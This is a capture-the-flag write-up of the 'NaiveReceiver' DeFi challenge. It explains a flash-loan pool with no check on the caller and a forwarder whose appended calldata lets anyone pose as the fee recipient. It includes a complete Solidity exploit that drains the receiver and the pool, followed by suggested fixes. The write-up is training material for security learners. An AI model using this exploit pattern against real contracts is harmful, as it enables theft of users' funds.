# NaiveReceiver

**As Always please try the challenge yourself first! Use your creativity, AI tools, YouTube tutorials on the topic, whatever it takes to try and solve it!** 

**Challenge Description:**

```
There’s a pool with 1000 WETH in balance offering flash loans. It has a fixed fee of 1 WETH. The pool supports meta-transactions by integrating with a permissionless forwarder contract. 

A user deployed a sample contract with 10 WETH in balance. Looks like it can execute flash loans of WETH.

All funds are at risk! Rescue all WETH from the user and the pool, and deposit it into the designated recovery account.
```

This challenge has one main vulnerability: Lack of Access Control. However, it does it in a tricky way to discover, esspecially if your knowledge on multicalls and calldata is not good enough. That was what I was missing to understand this challenge. 

**Lack of Access Control**
A lack of access control vulnerability occurs when a smart contract or system fails to properly restrict who can call certain functions or access specific resources. This allows unauthorized users (or even malicious actors) to perform actions they shouldn’t be able to, such as transferring funds, changing important variables, or modifying contract behavior.
 
**How does this challenge display this vulnerability?**

There are a few contracts in this challenge:

- `NaiveReceiverPool.sol` - The contract where users can deposit, withdraw and use for flashloans. 
- `BasicForwarder.sol` - The contract that defines how the forwarding of actions is executed. 
- `FlashLoanReceiver.sol` - The contract the will be able to perform the borrowing from the pool (uses OpenZeppelin's `IERC3156FlashBorrower` library).
- `Multicall.sol` - The contract that will take all the calls that are wanted to make in a single transaction. 

The first thing we need to do is figure out how to steal the receiver's funds (the address that can perform a flashloan). This is the quickest step in the challenge because of a single issue: The flashLoan function in the pool contract does not check if the function caller is in fact the receiver. This means that any malicious actors can call flash loan on behalf of them. 

<details><summary>Code Snippet of flashLoan</summary>

```javascript
                        //vvvvvv
function flashLoan(IERC3156FlashBorrower receiver, address token, uint256 amount, bytes calldata data)
        external
        returns (bool)
    {

        // NO CHECKS TO MAKE SURE WE ARE IN FACT receiver!

        if (token != address(weth)) revert UnsupportedCurrency();

        weth.transfer(address(receiver), amount);
        totalDeposits -= amount;

        if (receiver.onFlashLoan(msg.sender, address(weth), amount, FIXED_FEE, data) != CALLBACK_SUCCESS) {
            revert CallbackFailed();
        }

        uint256 amountWithFee = amount + FIXED_FEE;
        weth.transferFrom(address(receiver), address(this), amountWithFee);
        totalDeposits += amountWithFee;

        deposits[feeReceiver] += FIXED_FEE;

        return true;
    }
```

</details><br>

Next we see that the fee for using the flashloan functionality is 1 ETH. Simple math will dictate that if we perform 10 FlashLoans we will drain the receivers funds!

<details><summary>Code Snippet of FEE</summary>

```javascript
uint256 private constant FIXED_FEE = 1e18; // not the cheapest flash loan
```

</details><br>

That is step 1 completed. But we did not steal it for ourselves and we haven't touched the pools funds yet. Let's fix that...

Next we will have to look at the withdraw function:

<details><summary>Code Snippet of withdraw</summary>

```javascript
function withdraw(uint256 amount, address payable receiver) external {
        // Reduce deposits
        deposits[_msgSender()] -= amount;
        totalDeposits -= amount;

        // Transfer ETH to designated receiver
        weth.transfer(receiver, amount);
    }
```

</details>

We can see that we pass the amount we want to withdraw and where to send it to. Also, it calls an internal function called `_msgSender()`:

<details><summary>Code Snippet of _msgSender()</summary>

```javascript
function _msgSender() internal view override returns (address) {
        if (msg.sender == trustedForwarder && msg.data.length >= 20) {
            return address(bytes20(msg.data[msg.data.length - 20:]));
        } else {
            return super._msgSender();
        }
    }
```

</details><br>

It is an override function of what typically will return the caller of the function. It is used because of the meta-transaction capabilities in the contract, regarding `trustedForwarder`. Because of this ability, the function is looking to get the actual address that is calling through the forwarder. 

The function first checks if the caller is the forwarder and it if it is, does the data it passes is longer than 20. This is because an address is typically 20 bytes long. If the conditions are met, the function will return the address of the actual caller, if not it will simply return the msg.sender. 

Why is this relevant? Because we can use the `trusterForwarder` and pass the fee recipient's address to make the pool think it is them, but in fact it is us attacking. 

Using that logic and suing multicall to make it in one transaction will drain the pool from all of it's funds.

Here is the actual solution to the challenge now that we understand what is happening:

<details><summary>Solution</summary>

```javascript
function test_naiveReceiver() public checkSolvedByPlayer {
        // 1. Encoding the call to the flashLoan function from receiver (because the msg.sender is not checked to be receiver).
        bytes memory callToDrainReceiver =
            abi.encodeCall(pool.flashLoan, (FlashLoanReceiver(receiver), address(weth), 1 ether, bytes("")));

        // 2. Encoding the call to the withdraw function from pool, the amount we need is the sum of WETH_IN_POOL + WETH_IN_RECEIVER, and we want it to ourselves.
        // We are encoding deployer as well because they are the feeReceiver we are passing to trustedForwarder
        uint256 amountToSteal = WETH_IN_POOL + WETH_IN_RECEIVER;
        bytes memory callToDrainPool =
            abi.encodePacked(abi.encodeCall(pool.withdraw, (amountToSteal, payable(player))), deployer);

        // 3. We want to call the multicall function with 11 calls to drain the pool and drain the receiver.
        // We are first using 10 flashloan to drain the receiver, because they have 10 ether and the fee is 1 ether.
        // The last call is to withdraw from pool.
        bytes[] memory data = new bytes[](11);
        for (uint256 i = 0; i < data.length - 1; i++) {
            data[i] = callToDrainReceiver;
        }
        data[data.length - 1] = callToDrainPool;

        // 4. Creating the request struct for the trustedForwarder to execute for us
        BasicForwarder.Request memory request = BasicForwarder.Request({
            from: player,
            target: address(pool),
            value: 0,
            gas: 1000000,
            nonce: 0,
            data: abi.encodeCall(pool.multicall, data),
            deadline: block.timestamp
        });

        // 5. Write the hashed message. It include 3 parts:
        // i. "\x19\x01" - This part is a special Ethereum-specific prefix used when hashing structured data for signing. It’s sometimes referred to as the EIP-712 prefix (related to the EIP-712 standard for signing structured data).
        // ii. The domain separator - Used to make sure it is using the correct contract
        // iii. The data hash - the hash of the request struct
        bytes32 digest =
            keccak256(abi.encodePacked("\x19\x01", forwarder.domainSeparator(), forwarder.getDataHash(request)));

        // 6. Signing the hashed messag with our private key
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, digest);
        bytes memory signature = abi.encodePacked(r, s, v);

        // 7. Call the forwarder to execute the request
        forwarder.execute(request, signature);

        // 8. Send the funds to the recovery address
        weth.transfer(recovery, amountToSteal);
```

</details><br>

## Recommendations

1. Have a access control check for the receiver. If this is done the receiver cannot be drained:

<details><summary>Possible Fix for flashLoan</summary>

```diff
function flashLoan(IERC3156FlashBorrower receiver, address token, uint256 amount, bytes calldata data)
        external
        returns (bool)
    {

+       if (msg.sender != receiver){
+           revert customerError();
+       }

        if (token != address(weth)) revert UnsupportedCurrency();

        weth.transfer(address(receiver), amount);
        totalDeposits -= amount;

        if (receiver.onFlashLoan(msg.sender, address(weth), amount, FIXED_FEE, data) != CALLBACK_SUCCESS) {
            revert CallbackFailed();
        }

        uint256 amountWithFee = amount + FIXED_FEE;
        weth.transferFrom(address(receiver), address(this), amountWithFee);
        totalDeposits += amountWithFee;

        deposits[feeReceiver] += FIXED_FEE;

        return true;
    }
```

</details><br>

2. Add check for a signature to make sure that the transaction is authorized:

<details><summary>Possible Fix for flashLoan</summary>

```diff
function _msgSender() internal view override returns (address) {
    if (msg.sender == trustedForwarder) {
        // Ensure that the last 20 bytes of msg.data are a valid sender address
        address sender = address(bytes20(msg.data[msg.data.length - 20:]));

        // Optionally: Validate the signature to ensure it was authorized by the real sender
+       require(_isValidSignature(sender, msg.data), "Invalid signature for msg.sender");

        return sender;
    } else {
        return super._msgSender();
    }
}

```

</details><br>
